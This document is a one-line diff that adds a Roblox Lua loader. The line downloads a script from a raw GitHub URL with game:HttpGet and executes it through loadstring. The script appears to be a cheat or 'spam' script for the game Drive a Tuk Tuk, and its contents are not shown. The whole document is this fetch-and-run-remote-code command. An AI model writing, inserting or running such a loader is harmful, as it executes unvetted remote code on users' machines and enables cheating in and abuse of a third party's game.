@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/drive-a-tuk-tuk-spam4-m3h7wk9pgprs3t.lua"))()
